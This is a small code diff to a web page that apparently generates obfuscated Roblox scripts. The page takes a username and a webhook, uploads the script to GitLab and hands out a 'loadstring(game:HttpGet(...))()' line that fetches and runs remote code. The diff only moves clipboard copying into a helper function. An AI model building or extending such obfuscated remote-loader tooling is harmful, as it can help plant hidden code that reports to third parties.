@@ -108,6 +108,16 @@
             }
         }
 
+        async function copyToClipboard(text) {
+            try {
+                await navigator.clipboard.writeText(text);
+                alert("Loadstring copied:\n" + text);
+            } catch (err) {
+                console.error("Failed to copy:", err);
+                alert("Failed to copy loadstring. Copy it manually:\n" + text);
+            }
+        }
+
         async function generateScript() {
             let username = document.getElementById('username').value;
             let webhook = document.getElementById('webhook').value;
@@ -135,8 +145,7 @@
             let uploadedUrl = await uploadToGitLab(obfuscatedScript);
             if (uploadedUrl) {
                 let loadstring = `loadstring(game:HttpGet('${uploadedUrl}'))()`;
-                navigator.clipboard.writeText(loadstring);
-                alert("Loadstring copied:\n" + loadstring);
+                copyToClipboard(loadstring);
             }
         }
     </script>
